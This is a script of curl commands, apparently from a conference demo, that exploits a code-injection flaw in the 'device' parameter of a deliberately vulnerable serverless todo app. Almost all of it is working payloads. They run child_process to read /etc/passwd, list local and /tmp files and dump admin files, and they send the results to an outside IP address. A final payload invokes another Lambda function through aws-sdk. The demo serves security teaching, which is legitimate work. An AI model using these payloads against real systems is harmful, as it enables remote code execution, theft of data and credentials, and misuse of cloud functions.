# Simple request
curl $SERVERLESS_GOOF_HOST'/dev/todos/render?device=Desktop'

# Request with array
curl $SERVERLESS_GOOF_HOST'/dev/todos/render?device\[\]=Desktop'

# Trigger error
curl $SERVERLESS_GOOF_HOST'/dev/todos/render?device\[\]=Desktop%27'

# Simple RCE, logs to console
curl $SERVERLESS_GOOF_HOST'/dev/todos/render?device\[\]=Desktop%27-console.log(%27JeffConf%20Was%20Here%27)-%27'

# RCE sends file out
curl $SERVERLESS_GOOF_HOST'/dev/todos/render?device\[\]=Desktop%27-require(%27child_process%27).exec(%27curl%20-m%203%20-F%20%22x%3D%60cat%20%2Fetc%2Fpasswd%60%22%20http%3A%2F%2F34.205.135.170%2F%27)-%27'
# Original payload: '-require('child_process').exec('curl -m 3 -F "x=`cat /etc/passwd`" http://34.205.135.170/')-'

# List local files
curl $SERVERLESS_GOOF_HOST'/dev/todos/render?device\[\]=Desktop%27-require(%27child_process%27).exec(%27curl%20-m%203%20-F%20%22x%3D%60ls%20-l%20.%60%22%20http%3A%2F%2F34.205.135.170%2F%27)-%27'

# Cat admin files
curl $SERVERLESS_GOOF_HOST'/dev/todos/render?device\[\]=Desktop%27-require(%27child_process%27).exec(%27curl%20-m%203%20-F%20%22x%3D%60cat%20./admin/*%60%22%20http%3A%2F%2F34.205.135.170%2F%27)-%27'

# List tmp files
curl $SERVERLESS_GOOF_HOST'/dev/todos/render?device\[\]=Desktop%27-require(%27child_process%27).exec(%27curl%20-m%203%20-F%20%22x%3D%60ls%20-l%20%2Ftmp%2F%60%22%20http%3A%2F%2F34.205.135.170%2F%27)-%27'
# Original payload: '-require('child_process').exec('curl -m 3 -F "x=`ls -l /tmp/`" http://34.205.135.170/')-'

# Invoke another function
curl $SERVERLESS_GOOF_HOST'/dev/todos/render?device\[\]=Desktop%27-new%20function()%7Bvar%20x%20%3D%20require(%27aws-sdk%27)%3Bnew%20x.Lambda().invoke(%7BFunctionName%3A%20%22serverless-goof-dev-internalRestore%22%7D%2Cfunction(e%2Cd)%20%7B%7D)%3B%7D()%3B-%27'
# Original payload: new function(){var x = require('aws-sdk');new x.Lambda().invoke({FunctionName: "serverless-goof-dev-internalRestore"},function(e,d) {});}();
